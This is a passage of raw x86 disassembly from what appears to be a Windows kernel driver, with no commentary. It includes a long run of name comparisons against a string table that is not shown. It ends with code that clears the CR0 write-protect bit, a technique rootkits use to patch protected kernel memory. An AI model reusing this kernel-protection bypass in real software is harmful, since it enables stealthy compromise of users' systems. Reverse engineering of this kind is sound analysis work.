   13bbb:	je     0x13c81
   13bc1:	push   DWORD PTR [ebp+0x8]
   13bc4:	push   esi
   13bc5:	push   eax
   13bc6:	call   0x1a1b0
   13bcb:	add    esp,0xc
   13bce:	push   esi
   13bcf:	push   esi
   13bd0:	push   DWORD PTR [ebp+0x8]
   13bd3:	lea    eax,[ebp-0x18]
   13bd6:	push   DWORD PTR [ebp-0x4]
   13bd9:	push   eax
   13bda:	push   esi
   13bdb:	push   esi
   13bdc:	push   esi
   13bdd:	push   DWORD PTR [ebp-0x8]
   13be0:	call   DWORD PTR ds:0x1b184
   13be6:	test   eax,eax
   13be8:	jne    0x13c77
   13bee:	cmp    DWORD PTR [ebp+0x10],esi
   13bf1:	je     0x13c03
   13bf3:	push   DWORD PTR [ebp+0x8]
   13bf6:	push   DWORD PTR [ebp-0x4]
   13bf9:	call   0x10b16
   13bfe:	mov    ecx,DWORD PTR [ebp+0x10]
   13c01:	mov    DWORD PTR [ecx],eax
   13c03:	cmp    DWORD PTR [ebp+0xc],esi
   13c06:	je     0x13c77
   13c08:	push   DWORD PTR [ebp+0xc]
   13c0b:	lea    eax,[ebp-0x28]
   13c0e:	push   eax
   13c0f:	call   edi
   13c11:	push   esi
   13c12:	push   esi
   13c13:	push   0x60
   13c15:	push   0x5
   13c17:	push   0x1
   13c19:	push   0x80
   13c1e:	lea    eax,[ebp-0x28]
   13c21:	mov    DWORD PTR [ebp-0x38],eax
   13c24:	push   esi
   13c25:	lea    eax,[ebp-0x18]
   13c28:	push   eax
   13c29:	lea    eax,[ebp-0x40]
   13c2c:	push   eax
   13c2d:	push   0x100002
   13c32:	lea    eax,[ebp-0xc]
   13c35:	push   eax
   13c36:	mov    DWORD PTR [ebp-0x40],ebx
   13c39:	mov    DWORD PTR [ebp-0x3c],esi
   13c3c:	mov    DWORD PTR [ebp-0x34],0x240
   13c43:	mov    DWORD PTR [ebp-0x30],esi
   13c46:	mov    DWORD PTR [ebp-0x2c],esi
   13c49:	call   DWORD PTR ds:0x1b1e0
   13c4f:	test   eax,eax
   13c51:	jne    0x13c77
   13c53:	push   esi
   13c54:	push   esi
   13c55:	push   DWORD PTR [ebp+0x8]
   13c58:	lea    eax,[ebp-0x18]
   13c5b:	push   DWORD PTR [ebp-0x4]
   13c5e:	push   eax
   13c5f:	push   esi
   13c60:	push   esi
   13c61:	push   esi
   13c62:	push   DWORD PTR [ebp-0xc]
   13c65:	call   DWORD PTR ds:0x1b1dc
   13c6b:	push   DWORD PTR [ebp-0xc]
   13c6e:	mov    DWORD PTR [ebp-0x10],eax
   13c71:	call   DWORD PTR ds:0x1b180
   13c77:	push   esi
   13c78:	push   DWORD PTR [ebp-0x4]
   13c7b:	call   DWORD PTR ds:0x1b278
   13c81:	push   DWORD PTR [ebp-0x8]
   13c84:	call   DWORD PTR ds:0x1b180
   13c8a:	pop    edi
   13c8b:	pop    ebx
   13c8c:	mov    eax,DWORD PTR [ebp-0x10]
   13c8f:	pop    esi
   13c90:	leave  
   13c91:	ret    0xc
   13c94:	int3   
   13c95:	int3   
   13c96:	int3   
   13c97:	int3   
   13c98:	int3   
   13c99:	int3   
   13c9a:	mov    edi,edi
   13c9c:	push   ebp
   13c9d:	mov    ebp,esp
   13c9f:	sub    esp,0x2c
   13ca2:	push   esi
   13ca3:	xor    esi,esi
   13ca5:	cmp    DWORD PTR [ebp+0x8],esi
   13ca8:	push   edi
   13ca9:	mov    DWORD PTR [ebp-0x4],esi
   13cac:	mov    edi,0xc000000d
   13cb1:	je     0x13d0c
   13cb3:	push   DWORD PTR [ebp+0x8]
   13cb6:	lea    eax,[ebp-0xc]
   13cb9:	push   eax
   13cba:	call   DWORD PTR ds:0x1b164
   13cc0:	push   esi
   13cc1:	push   esi
   13cc2:	push   0x1
   13cc4:	push   0x2
   13cc6:	push   esi
   13cc7:	push   0x80
   13ccc:	lea    eax,[ebp-0xc]
   13ccf:	mov    DWORD PTR [ebp-0x24],eax
   13cd2:	push   esi
   13cd3:	lea    eax,[ebp-0x14]
   13cd6:	push   eax
   13cd7:	lea    eax,[ebp-0x2c]
   13cda:	push   eax
   13cdb:	push   esi
   13cdc:	lea    eax,[ebp-0x4]
   13cdf:	push   eax
   13ce0:	mov    DWORD PTR [ebp-0x2c],0x18
   13ce7:	mov    DWORD PTR [ebp-0x28],esi
   13cea:	mov    DWORD PTR [ebp-0x20],0x240
   13cf1:	mov    DWORD PTR [ebp-0x1c],esi
   13cf4:	mov    DWORD PTR [ebp-0x18],esi
   13cf7:	call   DWORD PTR ds:0x1b1e0
   13cfd:	mov    edi,eax
   13cff:	cmp    edi,esi
   13d01:	jne    0x13d0c
   13d03:	push   DWORD PTR [ebp-0x4]
   13d06:	call   DWORD PTR ds:0x1b180
   13d0c:	mov    eax,edi
   13d0e:	pop    edi
   13d0f:	pop    esi
   13d10:	leave  
   13d11:	ret    0x4
   13d14:	int3   
   13d15:	int3   
   13d16:	int3   
   13d17:	int3   
   13d18:	int3   
   13d19:	int3   
   13d1a:	mov    edi,edi
   13d1c:	push   ebp
   13d1d:	mov    ebp,esp
   13d1f:	sub    esp,0x38
   13d22:	push   edi
   13d23:	xor    edi,edi
   13d25:	cmp    DWORD PTR [ebp+0x8],edi
   13d28:	mov    DWORD PTR [ebp-0x8],edi
   13d2b:	mov    DWORD PTR [ebp-0x4],edi
   13d2e:	je     0x13e49
   13d34:	push   DWORD PTR [ebp+0x8]
   13d37:	lea    eax,[ebp-0x18]
   13d3a:	push   eax
   13d3b:	call   DWORD PTR ds:0x1b164
   13d41:	push   0x21
   13d43:	lea    eax,[ebp-0x18]
   13d46:	mov    DWORD PTR [ebp-0x30],eax
   13d49:	push   0x7
   13d4b:	lea    eax,[ebp-0x10]
   13d4e:	push   eax
   13d4f:	lea    eax,[ebp-0x38]
   13d52:	push   eax
   13d53:	push   0x100001
   13d58:	lea    eax,[ebp-0x4]
   13d5b:	push   eax
   13d5c:	mov    DWORD PTR [ebp-0x38],0x18
   13d63:	mov    DWORD PTR [ebp-0x34],edi
   13d66:	mov    DWORD PTR [ebp-0x2c],0x240
   13d6d:	mov    DWORD PTR [ebp-0x28],edi
   13d70:	mov    DWORD PTR [ebp-0x24],edi
   13d73:	call   DWORD PTR ds:0x1b18c
   13d79:	test   eax,eax
   13d7b:	jne    0x13e49
   13d81:	push   ebx
   13d82:	push   esi
   13d83:	mov    esi,0x250
   13d88:	push   esi
   13d89:	push   0x1
   13d8b:	call   DWORD PTR ds:0x1b124
   13d91:	mov    ebx,eax
   13d93:	cmp    ebx,edi
   13d95:	je     0x13e3e
   13d9b:	push   esi
   13d9c:	push   edi
   13d9d:	push   ebx
   13d9e:	call   0x1a1b0
   13da3:	add    esp,0xc
   13da6:	push   0x1
   13da8:	push   edi
   13da9:	push   0x1
   13dab:	push   0x1
   13dad:	push   esi
   13dae:	push   ebx
   13daf:	lea    eax,[ebp-0x10]
   13db2:	push   eax
   13db3:	push   edi
   13db4:	push   edi
   13db5:	push   edi
   13db6:	push   DWORD PTR [ebp-0x4]
   13db9:	call   DWORD PTR ds:0x1b1e8
   13dbf:	cmp    eax,edi
   13dc1:	jne    0x13e36
   13dc3:	cmp    eax,edi
   13dc5:	jne    0x13e0c
   13dc7:	test   BYTE PTR [ebx+0x38],0x10
   13dcb:	jne    0x13e0c
   13dcd:	lea    eax,[ebx+0x40]
   13dd0:	push   eax
   13dd1:	lea    eax,[ebp-0x20]
   13dd4:	push   eax
   13dd5:	call   DWORD PTR ds:0x1b164
   13ddb:	mov    eax,DWORD PTR [ebp-0x4]
   13dde:	mov    DWORD PTR [ebp-0x34],eax
   13de1:	lea    eax,[ebp-0x20]
   13de4:	mov    DWORD PTR [ebp-0x30],eax
   13de7:	lea    eax,[ebp-0x38]
   13dea:	push   eax
   13deb:	mov    DWORD PTR [ebp-0x38],0x18
   13df2:	mov    DWORD PTR [ebp-0x2c],0x40
   13df9:	mov    DWORD PTR [ebp-0x28],edi
   13dfc:	mov    DWORD PTR [ebp-0x24],edi
   13dff:	call   DWORD PTR ds:0x1b1e4
   13e05:	test   eax,eax
   13e07:	jne    0x13e0c
   13e09:	inc    DWORD PTR [ebp-0x8]
   13e0c:	push   esi
   13e0d:	push   edi
   13e0e:	push   ebx
   13e0f:	call   0x1a1b0
   13e14:	add    esp,0xc
   13e17:	push   edi
   13e18:	push   edi
   13e19:	push   0x1
   13e1b:	push   0x1
   13e1d:	push   esi
   13e1e:	push   ebx
   13e1f:	lea    eax,[ebp-0x10]
   13e22:	push   eax
   13e23:	push   edi
   13e24:	push   edi
   13e25:	push   edi
   13e26:	push   DWORD PTR [ebp-0x4]
   13e29:	call   DWORD PTR ds:0x1b1e8
   13e2f:	cmp    eax,0x80000006
   13e34:	jne    0x13dc3
   13e36:	push   edi
   13e37:	push   ebx
   13e38:	call   DWORD PTR ds:0x1b278
   13e3e:	push   DWORD PTR [ebp-0x4]
   13e41:	call   DWORD PTR ds:0x1b180
   13e47:	pop    esi
   13e48:	pop    ebx
   13e49:	mov    eax,DWORD PTR [ebp-0x8]
   13e4c:	pop    edi
   13e4d:	leave  
   13e4e:	ret    0x4
   13e51:	int3   
   13e52:	int3   
   13e53:	int3   
   13e54:	int3   
   13e55:	int3   
   13e56:	mov    edi,edi
   13e58:	push   ebp
   13e59:	mov    ebp,esp
   13e5b:	sub    esp,0x2c
   13e5e:	and    DWORD PTR [ebp-0x4],0x0
   13e62:	push   0x1a554
   13e67:	lea    eax,[ebp-0xc]
   13e6a:	push   eax
   13e6b:	call   DWORD PTR ds:0x1b164
   13e71:	and    DWORD PTR [ebp-0x28],0x0
   13e75:	and    DWORD PTR [ebp-0x1c],0x0
   13e79:	and    DWORD PTR [ebp-0x18],0x0
   13e7d:	push   0x20
   13e7f:	lea    eax,[ebp-0xc]
   13e82:	mov    DWORD PTR [ebp-0x24],eax
   13e85:	push   0x7
   13e87:	lea    eax,[ebp-0x14]
   13e8a:	push   eax
   13e8b:	lea    eax,[ebp-0x2c]
   13e8e:	push   eax
   13e8f:	push   0x100001
   13e94:	lea    eax,[ebp-0x4]
   13e97:	push   eax
   13e98:	mov    DWORD PTR [ebp-0x2c],0x18
   13e9f:	mov    DWORD PTR [ebp-0x20],0x240
   13ea6:	call   DWORD PTR ds:0x1b18c
   13eac:	test   eax,eax
   13eae:	jne    0x13eb9
   13eb0:	push   DWORD PTR [ebp-0x4]
   13eb3:	call   DWORD PTR ds:0x1b180
   13eb9:	xor    eax,eax
   13ebb:	leave  
   13ebc:	ret    
   13ebd:	int3   
   13ebe:	int3   
   13ebf:	int3   
   13ec0:	int3   
   13ec1:	int3   
   13ec2:	push   0x50
   13ec4:	push   0x1b4c8
   13ec9:	call   0x1a1c8
   13ece:	xor    ebx,ebx
   13ed0:	mov    DWORD PTR [ebp-0x2c],ebx
   13ed3:	mov    DWORD PTR [ebp-0x40],ebx
   13ed6:	mov    DWORD PTR [ebp-0x34],ebx
   13ed9:	mov    DWORD PTR [ebp-0x3c],ebx
   13edc:	mov    DWORD PTR [ebp-0x30],ebx
   13edf:	mov    DWORD PTR [ebp-0x24],ebx
   13ee2:	mov    DWORD PTR [ebp-0x38],ebx
   13ee5:	mov    DWORD PTR [ebp-0x28],ebx
   13ee8:	mov    esi,0x208
   13eed:	push   esi
   13eee:	push   0x1
   13ef0:	mov    edi,DWORD PTR ds:0x1b124
   13ef6:	call   edi
   13ef8:	mov    DWORD PTR [ebp-0x1c],eax
   13efb:	push   esi
   13efc:	push   0x1
   13efe:	call   edi
   13f00:	mov    DWORD PTR [ebp-0x20],eax
   13f03:	cmp    DWORD PTR [ebp-0x1c],ebx
   13f06:	je     0x146d9
   13f0c:	test   eax,eax
   13f0e:	je     0x146d9
   13f14:	mov    edi,DWORD PTR [ebp+0x8]
   13f17:	lea    ebx,[edi-0x30]
   13f1a:	push   esi
   13f1b:	push   0x0
   13f1d:	push   eax
   13f1e:	call   0x1a1b0
   13f23:	add    esp,0xc
   13f26:	push   ebx
   13f27:	movzx  eax,WORD PTR [edi]
   13f2a:	push   eax
   13f2b:	push   DWORD PTR [edi+0x4]
   13f2e:	push   0x104
   13f33:	push   DWORD PTR [ebp-0x20]
   13f36:	call   0x12610
   13f3b:	mov    eax,DWORD PTR [ebp+0x10]
   13f3e:	mov    eax,DWORD PTR [eax+0x4]
   13f41:	test   eax,eax
   13f43:	je     0x146d9
   13f49:	mov    ecx,DWORD PTR [ebp+0x10]
   13f4c:	cmp    DWORD PTR [ecx+0xc],0x0
   13f50:	je     0x146d9
   13f56:	and    DWORD PTR [ebp-0x4],0x0
   13f5a:	lea    ecx,[ebp-0x38]
   13f5d:	push   ecx
   13f5e:	lea    ecx,[ebp-0x30]
   13f61:	push   ecx
   13f62:	lea    ecx,[ebp-0x28]
   13f65:	push   ecx
   13f66:	push   eax
   13f67:	mov    eax,DWORD PTR [ebp+0x10]
   13f6a:	mov    eax,DWORD PTR [eax]
   13f6c:	shr    eax,0x8
   13f6f:	and    eax,0x1
   13f72:	push   eax
   13f73:	call   0x11236
   13f78:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   13f7f:	jmp    0x13f94
   13f81:	xor    eax,eax
   13f83:	inc    eax
   13f84:	ret    
   13f85:	mov    esp,DWORD PTR [ebp-0x18]
   13f88:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   13f8f:	mov    esi,0x208
   13f94:	push   0x5c
   13f96:	push   DWORD PTR [ebp-0x20]
   13f99:	call   DWORD PTR ds:0x1b16c
   13f9f:	pop    ecx
   13fa0:	pop    ecx
   13fa1:	xor    ebx,ebx
   13fa3:	cmp    eax,ebx
   13fa5:	je     0x1461a
   13fab:	push   0x2
   13fad:	pop    edi
   13fae:	add    eax,edi
   13fb0:	mov    DWORD PTR [ebp+0x8],eax
   13fb3:	mov    eax,DWORD PTR [ebp+0x10]
   13fb6:	test   WORD PTR [eax],0x100
   13fbb:	je     0x14115
   13fc1:	cmp    BYTE PTR ds:0x1bf8e,bl
   13fc7:	je     0x14115
   13fcd:	cmp    DWORD PTR ds:0x1c09c,ebx
   13fd3:	je     0x14115
   13fd9:	push   esi
   13fda:	push   ebx
   13fdb:	push   DWORD PTR [ebp-0x1c]
   13fde:	call   0x1a1b0
   13fe3:	add    esp,0xc
   13fe6:	mov    ecx,DWORD PTR ds:0x1c09c
   13fec:	mov    eax,ecx
   13fee:	lea    edx,[eax+0x2]
   13ff1:	mov    si,WORD PTR [eax]
   13ff4:	add    eax,edi
   13ff6:	cmp    si,bx
   13ff9:	jne    0x13ff1
   13ffb:	sub    eax,edx
   13ffd:	sar    eax,1
   13fff:	mov    ebx,0x103
   14004:	cmp    eax,ebx
   14006:	jae    0x1401d
   14008:	mov    eax,ecx
   1400a:	lea    esi,[eax+0x2]
   1400d:	mov    dx,WORD PTR [eax]
   14010:	add    eax,edi
   14012:	test   dx,dx
   14015:	jne    0x1400d
   14017:	sub    eax,esi
   14019:	sar    eax,1
   1401b:	jmp    0x1401f
   1401d:	mov    eax,ebx
   1401f:	push   eax
   14020:	push   ecx
   14021:	push   DWORD PTR [ebp-0x1c]
   14024:	call   DWORD PTR ds:0x1b194
   1402a:	add    esp,0xc
   1402d:	mov    edx,0x1abce
   14032:	mov    eax,edx
   14034:	lea    ecx,[eax+0x2]
   14037:	mov    si,WORD PTR [eax]
   1403a:	add    eax,edi
   1403c:	test   si,si
   1403f:	jne    0x14037
   14041:	sub    eax,ecx
   14043:	sar    eax,1
   14045:	mov    ecx,DWORD PTR [ebp-0x1c]
   14048:	lea    esi,[ecx+0x2]
   1404b:	mov    di,WORD PTR [ecx]
   1404e:	inc    ecx
   1404f:	inc    ecx
   14050:	test   di,di
   14053:	jne    0x1404b
   14055:	sub    ecx,esi
   14057:	sar    ecx,1
   14059:	mov    esi,ebx
   1405b:	sub    esi,ecx
   1405d:	cmp    eax,esi
   1405f:	jae    0x14076
   14061:	mov    eax,edx
   14063:	lea    esi,[eax+0x2]
   14066:	mov    cx,WORD PTR [eax]
   14069:	inc    eax
   1406a:	inc    eax
   1406b:	test   cx,cx
   1406e:	jne    0x14066
   14070:	sub    eax,esi
   14072:	sar    eax,1
   14074:	jmp    0x14090
   14076:	mov    eax,DWORD PTR [ebp-0x1c]
   14079:	lea    esi,[eax+0x2]
   1407c:	mov    cx,WORD PTR [eax]
   1407f:	inc    eax
   14080:	inc    eax
   14081:	test   cx,cx
   14084:	jne    0x1407c
   14086:	sub    eax,esi
   14088:	sar    eax,1
   1408a:	mov    ecx,eax
   1408c:	mov    eax,ebx
   1408e:	sub    eax,ecx
   14090:	push   eax
   14091:	push   edx
   14092:	push   DWORD PTR [ebp-0x1c]
   14095:	mov    edi,DWORD PTR ds:0x1b190
   1409b:	call   edi
   1409d:	add    esp,0xc
   140a0:	mov    eax,DWORD PTR [ebp+0x8]
   140a3:	lea    ecx,[eax+0x2]
   140a6:	mov    dx,WORD PTR [eax]
   140a9:	inc    eax
   140aa:	inc    eax
   140ab:	test   dx,dx
   140ae:	jne    0x140a6
   140b0:	sub    eax,ecx
   140b2:	sar    eax,1
   140b4:	mov    ecx,DWORD PTR [ebp-0x1c]
   140b7:	lea    edx,[ecx+0x2]
   140ba:	mov    si,WORD PTR [ecx]
   140bd:	inc    ecx
   140be:	inc    ecx
   140bf:	test   si,si
   140c2:	jne    0x140ba
   140c4:	sub    ecx,edx
   140c6:	sar    ecx,1
   140c8:	mov    edx,ebx
   140ca:	sub    edx,ecx
   140cc:	cmp    eax,edx
   140ce:	jae    0x140e6
   140d0:	mov    eax,DWORD PTR [ebp+0x8]
   140d3:	lea    edx,[eax+0x2]
   140d6:	mov    cx,WORD PTR [eax]
   140d9:	inc    eax
   140da:	inc    eax
   140db:	test   cx,cx
   140de:	jne    0x140d6
   140e0:	sub    eax,edx
   140e2:	sar    eax,1
   140e4:	jmp    0x14100
   140e6:	mov    eax,DWORD PTR [ebp-0x1c]
   140e9:	lea    edx,[eax+0x2]
   140ec:	mov    cx,WORD PTR [eax]
   140ef:	inc    eax
   140f0:	inc    eax
   140f1:	test   cx,cx
   140f4:	jne    0x140ec
   140f6:	sub    eax,edx
   140f8:	sar    eax,1
   140fa:	mov    ecx,eax
   140fc:	mov    eax,ebx
   140fe:	sub    eax,ecx
   14100:	push   eax
   14101:	push   DWORD PTR [ebp+0x8]
   14104:	push   DWORD PTR [ebp-0x1c]
   14107:	call   edi
   14109:	add    esp,0xc
   1410c:	lea    eax,[ebp-0x34]
   1410f:	push   eax
   14110:	push   DWORD PTR [ebp-0x1c]
   14113:	jmp    0x1411a
   14115:	lea    eax,[ebp-0x34]
   14118:	push   eax
   14119:	push   ebx
   1411a:	push   DWORD PTR [ebp-0x20]
   1411d:	call   0x13b1a
   14122:	push   DWORD PTR [ebp-0x20]
   14125:	push   DWORD PTR [ebp-0x34]
   14128:	push   0x0
   1412a:	call   0x11f8e
   1412f:	test   eax,eax
   14131:	jne    0x144fe
   14137:	push   0x1abb4
   1413c:	mov    edi,DWORD PTR [ebp+0x8]
   1413f:	push   edi
   14140:	mov    esi,DWORD PTR ds:0x1b168
   14146:	call   esi
   14148:	pop    ecx
   14149:	pop    ecx
   1414a:	test   eax,eax
   1414c:	je     0x14501
   14152:	push   0x1ab9a
   14157:	push   edi
   14158:	call   esi
   1415a:	pop    ecx
   1415b:	pop    ecx
   1415c:	test   eax,eax
   1415e:	je     0x14501
   14164:	push   0x1ab82
   14169:	push   edi
   1416a:	call   esi
   1416c:	pop    ecx
   1416d:	pop    ecx
   1416e:	test   eax,eax
   14170:	je     0x14501
   14176:	push   0x1ab68
   1417b:	push   edi
   1417c:	call   esi
   1417e:	pop    ecx
   1417f:	pop    ecx
   14180:	test   eax,eax
   14182:	je     0x14501
   14188:	push   0x1ab4a
   1418d:	push   edi
   1418e:	call   esi
   14190:	pop    ecx
   14191:	pop    ecx
   14192:	test   eax,eax
   14194:	je     0x14501
   1419a:	push   0x1ab32
   1419f:	push   edi
   141a0:	call   esi
   141a2:	pop    ecx
   141a3:	pop    ecx
   141a4:	test   eax,eax
   141a6:	je     0x14501
   141ac:	push   0x1ab1c
   141b1:	push   edi
   141b2:	call   esi
   141b4:	pop    ecx
   141b5:	pop    ecx
   141b6:	test   eax,eax
   141b8:	je     0x14501
   141be:	push   0x1ab02
   141c3:	push   edi
   141c4:	call   esi
   141c6:	pop    ecx
   141c7:	pop    ecx
   141c8:	test   eax,eax
   141ca:	je     0x14501
   141d0:	push   0x1aae8
   141d5:	push   edi
   141d6:	call   esi
   141d8:	pop    ecx
   141d9:	pop    ecx
   141da:	test   eax,eax
   141dc:	je     0x14501
   141e2:	push   0x1aace
   141e7:	push   edi
   141e8:	call   esi
   141ea:	pop    ecx
   141eb:	pop    ecx
   141ec:	test   eax,eax
   141ee:	je     0x14501
   141f4:	push   0x1aab4
   141f9:	push   edi
   141fa:	call   esi
   141fc:	pop    ecx
   141fd:	pop    ecx
   141fe:	test   eax,eax
   14200:	je     0x14501
   14206:	push   0x1aa9e
   1420b:	push   edi
   1420c:	call   esi
   1420e:	pop    ecx
   1420f:	pop    ecx
   14210:	test   eax,eax
   14212:	je     0x14501
   14218:	push   0x1aa86
   1421d:	push   edi
   1421e:	call   esi
   14220:	pop    ecx
   14221:	pop    ecx
   14222:	test   eax,eax
   14224:	je     0x14501
   1422a:	push   0x1aa6e
   1422f:	push   edi
   14230:	call   esi
   14232:	pop    ecx
   14233:	pop    ecx
   14234:	test   eax,eax
   14236:	je     0x14501
   1423c:	push   0x1aa58
   14241:	push   edi
   14242:	call   esi
   14244:	pop    ecx
   14245:	pop    ecx
   14246:	test   eax,eax
   14248:	je     0x14501
   1424e:	push   0x1aa40
   14253:	push   edi
   14254:	call   esi
   14256:	pop    ecx
   14257:	pop    ecx
   14258:	test   eax,eax
   1425a:	je     0x14501
   14260:	push   0x1aa22
   14265:	push   edi
   14266:	call   esi
   14268:	pop    ecx
   14269:	pop    ecx
   1426a:	test   eax,eax
   1426c:	je     0x14501
   14272:	push   0x1aa0c
   14277:	push   edi
   14278:	call   esi
   1427a:	pop    ecx
   1427b:	pop    ecx
   1427c:	test   eax,eax
   1427e:	je     0x14501
   14284:	push   0x1a9f2
   14289:	push   edi
   1428a:	call   esi
   1428c:	pop    ecx
   1428d:	pop    ecx
   1428e:	test   eax,eax
   14290:	je     0x14501
   14296:	push   0x1a9dc
   1429b:	push   edi
   1429c:	call   esi
   1429e:	pop    ecx
   1429f:	pop    ecx
   142a0:	test   eax,eax
   142a2:	je     0x14501
   142a8:	push   0x1a9ca
   142ad:	push   edi
   142ae:	call   esi
   142b0:	pop    ecx
   142b1:	pop    ecx
   142b2:	test   eax,eax
   142b4:	je     0x14501
   142ba:	push   0x1a9b6
   142bf:	push   edi
   142c0:	call   esi
   142c2:	pop    ecx
   142c3:	pop    ecx
   142c4:	test   eax,eax
   142c6:	je     0x14501
   142cc:	push   0x1a99c
   142d1:	push   edi
   142d2:	call   esi
   142d4:	pop    ecx
   142d5:	pop    ecx
   142d6:	test   eax,eax
   142d8:	je     0x14501
   142de:	push   0x1a984
   142e3:	push   edi
   142e4:	call   esi
   142e6:	pop    ecx
   142e7:	pop    ecx
   142e8:	test   eax,eax
   142ea:	je     0x14501
   142f0:	push   0x1a972
   142f5:	push   edi
   142f6:	call   esi
   142f8:	pop    ecx
   142f9:	pop    ecx
   142fa:	test   eax,eax
   142fc:	je     0x14501
   14302:	push   0x1a962
   14307:	push   edi
   14308:	call   esi
   1430a:	pop    ecx
   1430b:	pop    ecx
   1430c:	test   eax,eax
   1430e:	je     0x14501
   14314:	push   0x1a950
   14319:	push   edi
   1431a:	call   esi
   1431c:	pop    ecx
   1431d:	pop    ecx
   1431e:	test   eax,eax
   14320:	je     0x14501
   14326:	push   0x1a940
   1432b:	push   edi
   1432c:	call   esi
   1432e:	pop    ecx
   1432f:	pop    ecx
   14330:	test   eax,eax
   14332:	je     0x14501
   14338:	push   0x1a92c
   1433d:	push   edi
   1433e:	call   esi
   14340:	pop    ecx
   14341:	pop    ecx
   14342:	test   eax,eax
   14344:	je     0x14501
   1434a:	push   0x1a916
   1434f:	push   edi
   14350:	call   esi
   14352:	pop    ecx
   14353:	pop    ecx
   14354:	test   eax,eax
   14356:	je     0x14501
   1435c:	push   0x1a902
   14361:	push   edi
   14362:	call   esi
   14364:	pop    ecx
   14365:	pop    ecx
   14366:	test   eax,eax
   14368:	je     0x14501
   1436e:	push   0x1a8f0
   14373:	push   edi
   14374:	call   esi
   14376:	pop    ecx
   14377:	pop    ecx
   14378:	test   eax,eax
   1437a:	je     0x14501
   14380:	push   0x1a8e0
   14385:	push   edi
   14386:	call   esi
   14388:	pop    ecx
   14389:	pop    ecx
   1438a:	test   eax,eax
   1438c:	je     0x14501
   14392:	push   0x1a8cc
   14397:	push   edi
   14398:	call   esi
   1439a:	pop    ecx
   1439b:	pop    ecx
   1439c:	test   eax,eax
   1439e:	je     0x14501
   143a4:	push   0x1a8b2
   143a9:	push   edi
   143aa:	call   esi
   143ac:	pop    ecx
   143ad:	pop    ecx
   143ae:	test   eax,eax
   143b0:	je     0x14501
   143b6:	push   0x1a898
   143bb:	push   edi
   143bc:	call   esi
   143be:	pop    ecx
   143bf:	pop    ecx
   143c0:	test   eax,eax
   143c2:	je     0x14501
   143c8:	push   0x1a884
   143cd:	push   edi
   143ce:	call   esi
   143d0:	pop    ecx
   143d1:	pop    ecx
   143d2:	test   eax,eax
   143d4:	je     0x14501
   143da:	push   0x1a874
   143df:	push   edi
   143e0:	call   esi
   143e2:	pop    ecx
   143e3:	pop    ecx
   143e4:	test   eax,eax
   143e6:	je     0x14501
   143ec:	push   0x1a860
   143f1:	push   edi
   143f2:	call   esi
   143f4:	pop    ecx
   143f5:	pop    ecx
   143f6:	test   eax,eax
   143f8:	je     0x14501
   143fe:	push   0x1a848
   14403:	push   edi
   14404:	call   esi
   14406:	pop    ecx
   14407:	pop    ecx
   14408:	test   eax,eax
   1440a:	je     0x14501
   14410:	push   0x1a830
   14415:	push   edi
   14416:	call   esi
   14418:	pop    ecx
   14419:	pop    ecx
   1441a:	test   eax,eax
   1441c:	je     0x14501
   14422:	push   0x1a81e
   14427:	push   edi
   14428:	call   esi
   1442a:	pop    ecx
   1442b:	pop    ecx
   1442c:	test   eax,eax
   1442e:	je     0x14501
   14434:	push   0x1a808
   14439:	push   edi
   1443a:	call   esi
   1443c:	pop    ecx
   1443d:	pop    ecx
   1443e:	test   eax,eax
   14440:	je     0x14501
   14446:	push   0x1a7f0
   1444b:	push   edi
   1444c:	call   esi
   1444e:	pop    ecx
   1444f:	pop    ecx
   14450:	test   eax,eax
   14452:	je     0x14501
   14458:	push   0x1a7e0
   1445d:	push   edi
   1445e:	call   esi
   14460:	pop    ecx
   14461:	pop    ecx
   14462:	test   eax,eax
   14464:	je     0x14501
   1446a:	push   0x1a7c8
   1446f:	push   edi
   14470:	call   esi
   14472:	pop    ecx
   14473:	pop    ecx
   14474:	test   eax,eax
   14476:	je     0x14501
   1447c:	push   0x1a7ae
   14481:	push   edi
   14482:	call   esi
   14484:	pop    ecx
   14485:	pop    ecx
   14486:	test   eax,eax
   14488:	je     0x14501
   1448a:	push   0x1a796
   1448f:	push   edi
   14490:	call   esi
   14492:	pop    ecx
   14493:	pop    ecx
   14494:	test   eax,eax
   14496:	je     0x14501
   14498:	push   0x1a77c
   1449d:	push   edi
   1449e:	call   esi
   144a0:	pop    ecx
   144a1:	pop    ecx
   144a2:	test   eax,eax
   144a4:	je     0x14501
   144a6:	push   0x1a754
   144ab:	push   edi
   144ac:	call   esi
   144ae:	pop    ecx
   144af:	pop    ecx
   144b0:	test   eax,eax
   144b2:	je     0x14501
   144b4:	push   0x1a728
   144b9:	push   edi
   144ba:	call   esi
   144bc:	pop    ecx
   144bd:	pop    ecx
   144be:	test   eax,eax
   144c0:	je     0x14501
   144c2:	push   0x1a710
   144c7:	push   edi
   144c8:	call   esi
   144ca:	pop    ecx
   144cb:	pop    ecx
   144cc:	test   eax,eax
   144ce:	je     0x14501
   144d0:	push   0x1a6f6
   144d5:	push   edi
   144d6:	call   esi
   144d8:	pop    ecx
   144d9:	pop    ecx
   144da:	test   eax,eax
   144dc:	je     0x14501
   144de:	push   0x1a6e2
   144e3:	push   edi
   144e4:	call   esi
   144e6:	pop    ecx
   144e7:	pop    ecx
   144e8:	test   eax,eax
   144ea:	je     0x14501
   144ec:	push   0x1a6ce
   144f1:	push   edi
   144f2:	call   esi
   144f4:	pop    ecx
   144f5:	pop    ecx
   144f6:	test   eax,eax
   144f8:	jne    0x1461a
   144fe:	mov    edi,DWORD PTR [ebp+0x8]
   14501:	mov    esi,DWORD PTR [ebp-0x38]
   14504:	xor    ebx,ebx
   14506:	cmp    esi,ebx
   14508:	je     0x14590
   1450e:	cmp    DWORD PTR [ebp-0x30],0xc
   14512:	jb     0x14590
   14514:	mov    eax,DWORD PTR [ebp+0x10]
   14517:	test   WORD PTR [eax],0x100
   1451c:	je     0x1452a
   1451e:	push   esi
   1451f:	call   DWORD PTR ds:0x1b130
   14525:	movzx  eax,al
   14528:	jmp    0x1452d
   1452a:	xor    eax,eax
   1452c:	inc    eax
   1452d:	cmp    eax,ebx
   1452f:	je     0x14590
   14531:	mov    eax,DWORD PTR [ebp+0x10]
   14534:	test   WORD PTR [eax],0x100
   14539:	jne    0x1454b
   1453b:	push   0xc
   1453d:	push   esi
   1453e:	call   0x10a0a
   14543:	push   0xc
   14545:	push   esi
   14546:	call   0x10a4c
   1454b:	mov    eax,cr0
   1454e:	mov    DWORD PTR [ebp-0x2c],eax
   14551:	and    eax,0xfffeffff
   14556:	mov    cr0,eax
   14559:	mov    DWORD PTR [ebp-0x4],0x1
